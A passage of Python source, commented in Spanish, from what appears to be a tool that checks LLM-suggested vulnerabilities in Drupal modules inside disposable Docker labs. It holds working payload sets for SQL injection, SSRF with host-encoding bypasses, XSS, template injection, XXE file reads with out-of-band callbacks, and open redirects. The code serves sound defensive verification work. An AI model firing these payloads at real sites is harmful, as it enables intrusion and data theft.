                          f"reflejada) y de timing ciega para {cmd_param}, y ninguna confirmo la "
                          f"suma esperada ({a}+{b}={expected}) ni un retraso consistente -- la "
                          f"inyeccion de comandos no se confirmo")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red)...")
        lab.teardown()


def verify_drupal_sqli(
    module_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, sqli_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Cuarta clase de Drupal ("poco a poco"): equivalente a verify_wordpress_sqli. Mismas TRES
    tecnicas, de mas a menos dura (ver la version de WordPress para el razonamiento completo):
    1) error-based (extractvalue/updatexml) en varios contextos de comillas/comentario.
    2) UNION-based (fuerza bruta de columnas) si error-based no filtro nada.
    3) boolean-blind diferencial, y 4) time-based blind (SLEEP) como ultimo recurso.
    El laboratorio de Drupal usa el mismo motor MySQL que el de WordPress, asi que la logica de
    deteccion es identica -- Drupal tambien soporta PostgreSQL/SQLite, pero esta version del
    laboratorio instala siempre contra MySQL (ver _bootstrap_drupal_lab), igual que el de
    WordPress."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(module_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    params_list = list(parameters.keys()) if isinstance(parameters, dict) else list(parameters or [])
    sqli_param = sqli_param_hint or _pick_param(parameters, _SQLI_HINTS) or (params_list[0] if params_list else "")
    if not sqli_param:
        res.detail = "no se identifico el parametro a inyectar"
        res.limitations.append("la verificacion de SQLi necesita al menos un parametro; afina "
                               "'parameters' en la hipotesis del LLM o pasalo a mano "
                               "(sqli_param_hint)")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_drupal_lab(lab, module_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        m = (http_method or "GET").upper()
        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "1")
        orig_value = str(base_params.get(sqli_param) or "1")

        def send(val):
            payload = dict(base_params)
            payload[sqli_param] = val
            return boot.sub_sess.request(m, boot.base_url + endpoint,
                               data=payload if m != "GET" else None,
                               params=payload if m == "GET" else None, timeout=20)

        res.evidence.update({"login_bajo_privilegio": boot.sub_user,
                             "login_bajo_privilegio_password": boot.sub_pass,
                             "sqli_param": sqli_param, "metodo": m, "endpoint": endpoint})

        step("peticion de control (sin inyeccion)...")
        try:
            base_resp = send(orig_value)
        except Exception as e:
            res.detail = f"la peticion de control fallo: {e}"
            return res
        base_len = len(base_resp.text or "")
        # recorte de la respuesta de CONTROL (sin inyeccion) -- evidencia que lee el bucle de
        # aprendizaje-y-reintento del LLM cuando ninguna tecnica confirma nada (mismo patron que
        # verify_wordpress_sqli).
        res.evidence["respuesta_control_recorte"] = (base_resp.text or "")[:500]
        version_noise = set(re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", base_resp.text or ""))
        contexts = ["'", '"', "", "')", '")']
        comments = ["-- -", "#"]

        step("probando error-based (extractvalue/updatexml) para extraer version() real...")
        error_tried = []
        error_found = None
        for ctx in contexts:
            for fn in ("extractvalue(1,concat(0x7e,version()))", "updatexml(1,concat(0x7e,version()),1)"):
                for cm in comments:
                    payload_val = f"{orig_value}{ctx} AND {fn}{cm}"
                    try:
                        r = send(payload_val)
                    except Exception as e:
                        error_tried.append({"payload": payload_val, "error": str(e)})
                        continue
                    new_versions = set(re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", r.text or "")) - version_noise
                    error_tried.append({"payload": payload_val, "status": r.status_code,
                                        "version_nueva": sorted(new_versions)})
                    if new_versions:
                        error_found = (payload_val, sorted(new_versions)[0], r)
                        break
                if error_found:
                    break
            if error_found:
                break

        if error_found:
            payload_val, mysql_version, r = error_found
            res.verified = True
            res.ok = True
            res.evidence["tecnica"] = "error-based"
            res.evidence["payload_ganador"] = payload_val
            res.evidence["mysql_version_extraida"] = mysql_version
            res.evidence["status_code_respuesta"] = r.status_code
            res.evidence["respuesta_cuerpo_recorte"] = (r.text or "")[:500]
            res.evidence["error_based_intentos"] = error_tried
            res.detail = (f"SQLI confirmada (error-based): el mensaje de error incluyo la "
                          f"version real de la base de datos ({mysql_version})")
            step(f"VERIFICADO (error-based): version real del motor filtrada: {mysql_version}")
            return res
        res.evidence["error_based_intentos_resumen"] = (f"{len(error_tried)} combinaciones "
                                                         f"probadas, ninguna filtro version()")

        step("error-based no filtro nada; probando UNION-based (fuerza bruta de columnas)...")
        union_tried = []
        union_found = None
        for ctx in contexts:
            for cm in comments:
                for n in range(1, 9):
                    for pos in range(n):
                        cols = ["NULL"] * n
                        cols[pos] = "version()"
                        payload_val = f"{orig_value}{ctx} UNION SELECT {','.join(cols)}{cm}"
                        try:
                            r = send(payload_val)
                        except Exception as e:
                            union_tried.append({"payload": payload_val, "error": str(e)})
                            continue
                        new_versions = set(re.findall(r"\b\d\.\d{1,2}\.\d{1,3}\b", r.text or "")) - version_noise
                        union_tried.append({"payload": payload_val, "status": r.status_code,
                                            "version_nueva": sorted(new_versions)})
                        if new_versions:
                            union_found = (payload_val, sorted(new_versions)[0], r)
                            break
                    if union_found:
                        break
                if union_found:
                    break
            if union_found:
                break

        if union_found:
            payload_val, mysql_version, r = union_found
            res.verified = True
            res.ok = True
            res.evidence["tecnica"] = "union-based"
            res.evidence["payload_ganador"] = payload_val
            res.evidence["mysql_version_extraida"] = mysql_version
            res.evidence["status_code_respuesta"] = r.status_code
            res.evidence["respuesta_cuerpo_recorte"] = (r.text or "")[:500]
            res.evidence["union_intentos"] = union_tried
            res.detail = (f"SQLI confirmada (UNION-based): la base de datos devolvio su "
                          f"version real ({mysql_version}) dentro de la respuesta")
            step(f"VERIFICADO (UNION-based): version real del motor filtrada: {mysql_version}")
            return res
        res.evidence["union_intentos_resumen"] = (f"{len(union_tried)} combinaciones probadas, "
                                                   f"ninguna filtro version()")

        step("UNION no filtro nada; probando boolean-based (diferencial TRUE/FALSE)...")
        pairs = [
            (f"{orig_value}' OR '1'='1", f"{orig_value}' OR '1'='2"),
            (f"{orig_value}' AND '1'='1", f"{orig_value}' AND '1'='2"),
            (f'{orig_value}" OR "1"="1', f'{orig_value}" OR "1"="2'),
            (f"{orig_value}') OR ('1'='1", f"{orig_value}') OR ('1'='2"),
            (f"{orig_value} OR 1=1", f"{orig_value} OR 1=2"),
        ]
        bool_tried = []
        consistent_diffs = 0
        for true_p, false_p in pairs:
            try:
                rt = send(true_p)
                rf = send(false_p)
            except Exception as e:
                bool_tried.append({"true": true_p, "false": false_p, "error": str(e)})
                continue
            lt, lf = len(rt.text or ""), len(rf.text or "")
            threshold = max(20, 0.05 * base_len)
            differs = (rt.status_code != rf.status_code) or (abs(lt - lf) > threshold)
            matches_base = abs(lt - base_len) <= threshold
            bool_tried.append({"true": true_p, "false": false_p, "status_true": rt.status_code,
                               "status_false": rf.status_code, "len_true": lt, "len_false": lf,
                               "difiere": differs, "true_coincide_con_base": matches_base})
            if differs and matches_base:
                consistent_diffs += 1
        res.evidence["boolean_intentos"] = bool_tried

        if consistent_diffs >= 2:
            res.verified = True
            res.ok = True
            res.evidence["tecnica"] = "boolean-blind-differential"
            res.detail = (f"SQLI probable (boolean-blind, diferencial): {consistent_diffs}/"
                          f"{len(pairs)} pares TRUE/FALSE mostraron una diferencia consistente")
            step(f"VERIFICADO (boolean-blind): {consistent_diffs}/{len(pairs)} pares mostraron "
                 f"diferencia consistente")
            return res

        step("boolean-blind no mostro diferencia; probando time-based blind (SLEEP)...")
        timing_pairs = [
            (f"{orig_value}' AND SLEEP(5)-- -", f"{orig_value}' AND SLEEP(0)-- -"),
            (f"{orig_value} AND SLEEP(5)-- -", f"{orig_value} AND SLEEP(0)-- -"),
            (f"{orig_value}' OR SLEEP(5)-- -", f"{orig_value}' OR SLEEP(0)-- -"),
        ]
        timing_tried = []
        timing_consistent = 0
        for slow_p, fast_p in timing_pairs:
            try:
                t0_f = time.time()
                send(fast_p)
                fast_s = time.time() - t0_f
                t0_sl = time.time()
                send(slow_p)
                slow_s = time.time() - t0_sl
            except Exception as e:
                timing_tried.append({"slow": slow_p, "fast": fast_p, "error": str(e)})
                continue
            delayed = (slow_s - fast_s) >= 3.5
            timing_tried.append({"slow": slow_p, "fast": fast_p, "slow_s": round(slow_s, 2),
                                 "fast_s": round(fast_s, 2), "retraso_consistente": delayed})
            if delayed:
                timing_consistent += 1
        res.evidence["timing_intentos"] = timing_tried

        if timing_consistent >= 2:
            res.verified = True
            res.ok = True
            res.evidence["tecnica"] = "time-based-blind"
            res.detail = (f"SQLI probable (time-based blind): {timing_consistent}/"
                          f"{len(timing_pairs)} pares SLEEP(5)/SLEEP(0) mostraron un retraso "
                          f"consistente")
            step(f"VERIFICADO (time-based blind): {timing_consistent}/{len(timing_pairs)} pares "
                 f"mostraron retraso consistente")
        else:
            res.ok = True
            res.detail = (f"error-based ({len(error_tried)}) y UNION-based ({len(union_tried)}) "
                          f"no filtraron version(), boolean-blind no mostro diferencia "
                          f"consistente ({consistent_diffs}/{len(pairs)}) y time-based blind "
                          f"tampoco ({timing_consistent}/{len(timing_pairs)}) -- la inyeccion "
                          f"SQL no se confirmo")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red)...")
        lab.teardown()


def verify_drupal_ssrf(
    module_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, url_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Sexta clase de Drupal ("poco a poco"): equivalente a verify_wordpress_ssrf. Mismo listener
    interno en la red del laboratorio y las mismas variantes de codificacion de IP/host (literal,
    decimal, hex, octal, trucos de userinfo) -- ver la version de WordPress para el detalle."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(module_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    url_param = url_param_hint or _pick_param(parameters, _URL_HINTS)
    if not url_param:
        res.detail = "no se identifico el parametro que lleva la URL/recurso remoto"
        res.limitations.append("la verificacion de SSRF necesita saber que parametro lleva la "
                               "URL remota; afina 'parameters' en la hipotesis del LLM o pasalo "
                               "a mano (url_param_hint)")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_drupal_lab(lab, module_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        step("levantando el contenedor 'callback' (listener) en la red interna del laboratorio...")
        listener = lab.start_listener()
        if not listener:
            res.detail = "no se pudo levantar el contenedor listener para SSRF"
            return res

        listener_ip = lab.container_ip(lab.listener)
        m = (http_method or "GET").upper()
        found = False
        tried = []

        def build_urls(tok: str) -> List[str]:
            path = f"binoracle-ssrf-{tok}"
            urls = [f"http://{lab.listener}:8080/{path}"]
            if listener_ip:
                parts = [int(x) for x in listener_ip.split(".")]
                dec = (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]
                hexip = "0x" + "".join(f"{x:02x}" for x in parts)
                octip = "0" + ".".join(f"{x:03o}" for x in parts)
                urls += [
                    f"http://{listener_ip}:8080/{path}", f"http://{dec}:8080/{path}",
                    f"http://{hexip}:8080/{path}", f"http://{octip}:8080/{path}",
                    f"http://trusted-host@{listener_ip}:8080/{path}",
                    f"http://{listener_ip}:8080@evil.invalid/{path}",
                    f"http://{lab.listener}.:8080/{path}",
                ]
            return urls

        first_resp_captured = False
        for attempt_url in build_urls(_token()):
            token = attempt_url.rsplit("binoracle-ssrf-", 1)[-1]
            payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
            payload[url_param] = attempt_url
            step(f"probando {m} {endpoint} con {url_param}={attempt_url!r}...")
            entry = {"url": attempt_url, "token": token}
            try:
                resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                                   data=payload if m != "GET" else None,
                                   params=payload if m == "GET" else None, timeout=20)
                entry["status"] = resp.status_code
                if not first_resp_captured:
                    res.evidence["respuesta_muestra_primer_intento"] = (resp.text or "")[:500]
                    first_resp_captured = True
            except Exception as e:
                entry["peticion_error"] = str(e)
            time.sleep(2)
            log = lab.listener_log()
            entry["token_en_log"] = token in log
            tried.append(entry)
            if token in log:
                found = True
                res.evidence["callback_url_ganadora"] = attempt_url
                res.evidence["token_ganador"] = token
                res.evidence["listener_log_recorte"] = log[:1000]
                break

        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "url_param": url_param, "listener_ip": listener_ip,
            "metodo": m, "endpoint": endpoint, "intentos": tried,
        })

        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"SSRF confirmado: el listener interno recibio una conexion con el "
                          f"token exacto tras la peticion con {url_param}="
                          f"{res.evidence['callback_url_ganadora']!r}")
            step(f"VERIFICADO: el listener interno recibio el token "
                 f"'{res.evidence['token_ganador']}'.")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de URL/codificacion y ninguna "
                          f"hizo que el token llegara al listener interno -- el SSRF no se "
                          f"confirmo")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red)...")
        lab.teardown()


def verify_drupal_xss(
    module_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, xss_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Septima clase de Drupal ("poco a poco"): equivalente a verify_wordpress_xss. Reusa
    _xss_render() de wpverify.py tal cual (es CMS-agnostico: solo necesita base_url/endpoint/
    metodo/params/cookies) -- mismo catalogo de payloads de contexto HTML/atributo/JS-string/URI."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(module_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    xss_param = xss_param_hint or _pick_param(parameters, _XSS_HINTS)
    if not xss_param:
        res.detail = "no se identifico el parametro donde se refleja el payload"
        res.limitations.append("la verificacion de XSS necesita saber que parametro se refleja; "
                               "afina 'parameters' en la hipotesis del LLM o pasalo a mano "
                               "(xss_param_hint)")
        return res

    try:
        from playwright.sync_api import sync_playwright  # noqa: F401
    except Exception:
        res.available = False
        res.detail = ("Playwright no esta instalado: la verificacion de XSS necesita un "
                     "navegador real para confirmar EJECUCION")
        res.limitations.append("verificacion dinamica NO intentada: falta Playwright "
                               "(pip install playwright && playwright install chromium)")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_drupal_lab(lab, module_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        from urllib.parse import urlsplit
        host = urlsplit(boot.base_url).hostname or "127.0.0.1"
        cookies = [{"name": c.name, "value": c.value, "domain": host, "path": "/"}
                  for c in boot.sub_sess.cookies]

        token = _token()
        marker = f"binoracle-xss-{token}"
        js = f"document.title='{marker}'"
        attempts = [
            f"<script>{js}</script>", f"<img src=x onerror=\"{js}\">", f"<svg onload=\"{js}\">",
            f"<body onload=\"{js}\">", f"<iframe src=\"javascript:{js}\"></iframe>",
            f"<details open ontoggle=\"{js}\">x</details>",
            f"\"><script>{js}</script>", f"'><script>{js}</script>",
            f"\" onmouseover=\"{js}\" x=\"", f"' onmouseover='{js}' x='",
            f"';{js};//", f'";{js};//', f"</script><script>{js}</script>",
            f"<ScRiPt>{js}</sCrIpT>", f"<svg/onload=\"{js}\">",
        ]
        attempts += load_xss_payloads(js)

        m = (http_method or "GET").upper()
        found = False
        tried = []
        # UN SOLO navegador para todos los intentos (ver _XssBrowserSession en wpverify.py) --
        # arrancar un Chromium por payload, con las ~500+ variantes de payload_kb.py sumadas,
        # tarda minutos; el coste real es el arranque del propio navegador.
        step(f"arrancando Chromium headless (se reutiliza para los {len(attempts)} intentos)...")
        with _XssBrowserSession() as xb:
            for payload_value in attempts:
                params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
                params[xss_param] = payload_value
                title, _png = xb.render(boot.base_url, endpoint, m, params, cookies)
                tried.append({"payload": payload_value, "title_resultante": title})
                if title == marker:
                    found = True
                    res.evidence["payload_ganador"] = payload_value
                    step(f"VERIFICADO: el navegador EJECUTO el script inyectado -- document.title "
                         f"cambio exactamente a '{marker}'.")
                    break
        res.evidence.update({"login_bajo_privilegio": boot.sub_user,
                             "login_bajo_privilegio_password": boot.sub_pass,
                             "xss_param": xss_param, "token": token, "metodo": m,
                             "endpoint": endpoint, "intentos": tried})
        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"XSS confirmado: el navegador real EJECUTO el script inyectado en "
                          f"{xss_param} -- document.title cambio exactamente a '{marker}'")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de XSS para {xss_param} y en "
                          f"ninguna el navegador ejecuto el script -- el XSS no se confirmo")
            try:
                sample_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
                sample_params[xss_param] = attempts[0] if attempts else ""
                sample_resp = boot.sub_sess.request(
                    m, boot.base_url + endpoint,
                    data=sample_params if m != "GET" else None,
                    params=sample_params if m == "GET" else None, timeout=15)
                res.evidence["respuesta_cuerpo_recorte"] = (sample_resp.text or "")[:500]
            except Exception:
                pass
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red)...")
        lab.teardown()


def verify_drupal_ssti(
    module_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, ssti_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Octava clase de Drupal ("poco a poco"): equivalente a verify_wordpress_ssti. Drupal usa
    Twig como motor de plantillas por defecto desde D8 (a diferencia del ecosistema PHP/Smarty
    tipico de WordPress), asi que la sintaxis {{ }} es la mas relevante aqui -- se mantienen las
    demas sintaxis en la lista porque un modulo puede incluir su propio motor custom."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(module_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    ssti_param = ssti_param_hint or _pick_param(parameters, _XSS_HINTS)
    if not ssti_param:
        res.detail = "no se identifico el parametro que llega al motor de plantillas"
        res.limitations.append("la verificacion de SSTI necesita saber que parametro llega a la "
                               "plantilla; afina 'parameters' en la hipotesis del LLM o pasalo a "
                               "mano (ssti_param_hint)")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_drupal_lab(lab, module_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        a, b = secrets.randbelow(90) + 10, secrets.randbelow(90) + 10
        expected = a * b
        mul = f"{a}*{b}"
        attempts = [
            f"{{{{{mul}}}}}", f"${{{mul}}}", f"#{{{mul}}}", f"<%= {mul} %>",
            f"{{{mul}}}", f"${{{{{mul}}}}}", f"<#if true>${{{mul}}}</#if>",
            f"}}{{{mul}}}{{", f"'}}{{{mul}}}{{'", f'"}}{{{mul}}}{{"', f"-}}{{{mul}}}{{-",
            f"\">{{{{{mul}}}}}<\"",
            # Twig (Drupal moderno): el filtro |raw/|escape no aplica a una expresion sin
            # imprimir, asi que la forma basica {{ a*b }} ya cubre el caso mas comun.
            f"{{{{ {mul} }}}}",
        ]
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "ssti_param": ssti_param, "a": a, "b": b, "producto_esperado": expected,
            "metodo": (http_method or "GET").upper(), "endpoint": endpoint,
        })

        m = (http_method or "GET").upper()
        pattern = re.compile(rf"(?<!\d){expected}(?!\d)")
        found = False
        tried = []
        first_resp_captured = False
        for payload_value in attempts:
            payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
            payload[ssti_param] = payload_value
            step(f"probando {m} {endpoint} con {ssti_param}={payload_value!r}...")
            try:
                resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                                   data=payload if m != "GET" else None,
                                   params=payload if m == "GET" else None, timeout=20)
            except Exception as e:
                tried.append({"payload": payload_value, "error": str(e)})
                continue
            if not first_resp_captured:
                res.evidence["respuesta_muestra_primer_intento"] = (resp.text or "")[:500]
                first_resp_captured = True
            matched = bool(pattern.search(resp.text or ""))
            tried.append({"payload": payload_value, "status": resp.status_code,
                         "producto_presente": matched})
            if matched:
                found = True
                res.evidence["payload_ganador"] = payload_value
                res.evidence["status_code_respuesta"] = resp.status_code
                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
                step(f"VERIFICADO: la respuesta contiene {expected} (={a}*{b}), calculado por el "
                     f"motor de plantillas.")
                break
        res.evidence["intentos"] = tried
        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"SSTI confirmada: la peticion con {ssti_param}="
                          f"{res.evidence['payload_ganador']!r} hizo que el motor de plantillas "
                          f"EVALUARA {a}*{b} y devolviera {expected} en la respuesta")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} sintaxis de plantilla para {ssti_param} y "
                          f"ninguna produjo el producto esperado ({a}*{b}={expected}) -- el "
                          f"SSTI no se confirmo")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red)...")
        lab.teardown()


def verify_drupal_xxe(
    module_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, xml_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Novena clase de Drupal ("poco a poco"): equivalente a verify_wordpress_xxe. Mismo canario
    + entidad externa + fallback OOB via el listener de SSRF -- ver la version de WordPress."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(module_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    xml_param = xml_param_hint or _pick_param(parameters, _XML_HINTS)

    lab = _Lab(_token())
    try:
        boot = _bootstrap_drupal_lab(lab, module_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        secret = secrets.token_hex(16)
        canary_path = f"/tmp/binoracle_canary_{_token()}.txt"
        step(f"plantando fichero canario con un secreto aleatorio en {canary_path}...")
        if not lab.write_canary(canary_path, secret):
            res.detail = f"no se pudo plantar el fichero canario en {canary_path}"
            return res

        xxe_xml = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
                  f'"file://{canary_path}">]><foo>&xxe;</foo>')
        xxe_param_entity = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM '
                           f'"file://{canary_path}"> %xxe; ]><foo>test</foo>')
        xxe_soap = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
                   f'"file://{canary_path}">]><soap:Envelope '
                   f'xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>'
                   f'<foo>&xxe;</foo></soap:Body></soap:Envelope>')
        xml_variants = [("entidad general (DOCTYPE normal)", xxe_xml),
                        ("parametro-entidad", xxe_param_entity),
                        ("envuelta en SOAP", xxe_soap)]
        m = (http_method or "GET").upper()
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "xml_param": xml_param or "(cuerpo crudo)", "canary_path": canary_path,
            "canary_secret": secret, "metodo": m, "endpoint": endpoint,
        })

        tried = []
        found = False
        first_resp_captured = False

        def try_send(label, **kwargs):
            nonlocal found, first_resp_captured
            step(f"probando {m} {endpoint} ({label})...")
            try:
                resp = boot.sub_sess.request(m, boot.base_url + endpoint, timeout=20, **kwargs)
            except Exception as e:
                tried.append({"modo": label, "error": str(e)})
                return
            if not first_resp_captured:
                res.evidence["respuesta_muestra_primer_intento"] = (resp.text or "")[:500]
                first_resp_captured = True
            present = secret in (resp.text or "")
            tried.append({"modo": label, "status": resp.status_code, "secreto_presente": present})
            if present and not found:
                found = True
                res.evidence["modo_ganador"] = label
                res.evidence["status_code_respuesta"] = resp.status_code
                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
                step(f"VERIFICADO: el secreto plantado aparecio literal en la respuesta "
                     f"({label}).")

        for label, xml_body in xml_variants:
            if found:
                break
            if xml_param:
                payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
                payload[xml_param] = xml_body
                try_send(f"{label}, parametro de formulario",
                         data=payload if m != "GET" else None,
                         params=payload if m == "GET" else None)
            if not found:
                try_send(f"{label}, cuerpo crudo application/xml", data=xml_body.encode(),
                         headers={"Content-Type": "application/xml"})
            if not found:
                try_send(f"{label}, cuerpo crudo text/xml", data=xml_body.encode(),
                         headers={"Content-Type": "text/xml"})

        res.evidence["intentos"] = tried

        oob_hit = None
        if not found:
            step("ninguna variante en banda devolvio el secreto; probando XXE ciego/OOB via el "
                 "listener interno...")
            listener = lab.start_listener()
            if listener:
                oob_token = _token()
                oob_xml = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
                          f'"http://{lab.listener}:8080/binoracle-xxe-oob-{oob_token}">]>'
                          f'<foo>&xxe;</foo>')
                payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
                try:
                    if xml_param:
                        payload[xml_param] = oob_xml
                        boot.sub_sess.request(m, boot.base_url + endpoint,
                                   data=payload if m != "GET" else None,
                                   params=payload if m == "GET" else None, timeout=20)
                    else:
                        boot.sub_sess.request(m, boot.base_url + endpoint, data=oob_xml.encode(),
                                   headers={"Content-Type": "application/xml"}, timeout=20)
                except Exception:
                    pass
                time.sleep(2)
                oob_log = lab.listener_log()
                oob_hit = oob_token in oob_log
                res.evidence["oob_intento"] = {"token": oob_token, "hit": oob_hit}
                if oob_hit:
                    found = True
                    res.evidence["tecnica"] = "oob-blind"
                    res.evidence["modo_ganador"] = "OOB via listener interno"

        if found:
            res.verified = True
            res.ok = True
            if res.evidence.get("tecnica") == "oob-blind":
                res.detail = ("XXE ciego/OOB confirmado: el parser XML intento resolver una "
                              "entidad externa apuntando al listener interno")
            else:
                res.detail = (f"XXE confirmada ({res.evidence['modo_ganador']}): la respuesta "
                              f"contiene el secreto exacto plantado en {canary_path}")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} formas de mandar la entidad externa y el "
                          f"intento OOB, y ninguna confirmo nada -- el XXE no se confirmo")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red)...")
        lab.teardown()


def verify_drupal_open_redirect(
    module_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, redirect_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Decima clase de Drupal ("poco a poco"): equivalente a verify_wordpress_open_redirect.
    Nota: Drupal core trae su PROPIO filtro de open-redirect (UrlHelper::isExternal() +
    el parametro 'destination'/'redirect' se valida contra el whitelist de rutas internas en
    muchos casos centrales) -- asi que un open redirect real en Drupal suele estar en un modulo
    CUSTOM que construye su propia redireccion sin pasar por esa validacion central; las mismas
    variantes de bypass siguen aplicando ahi."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(module_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    redirect_param = redirect_param_hint or _pick_param(parameters, _REDIRECT_HINTS)
    if not redirect_param:
        res.detail = "no se identifico el parametro que lleva la URL de destino"
        res.limitations.append("la verificacion de open redirect necesita saber que parametro "
                               "lleva la URL de destino; afina 'parameters' en la hipotesis del "
                               "LLM o pasalo a mano (redirect_param_hint)")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_drupal_lab(lab, module_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        token = _token()
        evil_host = f"binoracle-lab-redirect-{token}.invalid"
        targets = [
            f"https://{evil_host}/pwned", f"//{evil_host}/pwned",
            f"https:/\\{evil_host}/pwned", f"https:\\\\{evil_host}\\pwned",
            f"https://trusted.example.com@{evil_host}/pwned",
            f"https://{evil_host}\\@trusted.example.com/pwned",
            f" https://{evil_host}/pwned", f"\thttps://{evil_host}/pwned",
            f"https://{evil_host}#@trusted.example.com/",
            f"https://trusted.example.com.{evil_host}/pwned",
            f"///{evil_host}/pwned", f"////{evil_host}/pwned",
            f"/https://{evil_host}/pwned",
        ]
        from .payload_kb import load_open_redirect_templates
        targets += load_open_redirect_templates(evil_host)
        m = (http_method or "GET").upper()
        tried = []
        confirmed_entry = None
        for target in targets:
            payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
            payload[redirect_param] = target
            step(f"probando {m} {endpoint} con {redirect_param}={target!r} (sin seguir redirects)...")
            try:
                resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                                   data=payload if m != "GET" else None,
                                   params=payload if m == "GET" else None, timeout=20,
                                   allow_redirects=False)
            except Exception as e:
                tried.append({"target": target, "error": str(e)})
                continue
            location = resp.headers.get("Location", "")
            is_redirect = resp.status_code in (301, 302, 303, 307, 308)
            confirmed = is_redirect and _redirect_location_is_external(location, evil_host)
            tried.append({"target": target, "status": resp.status_code, "location": location,
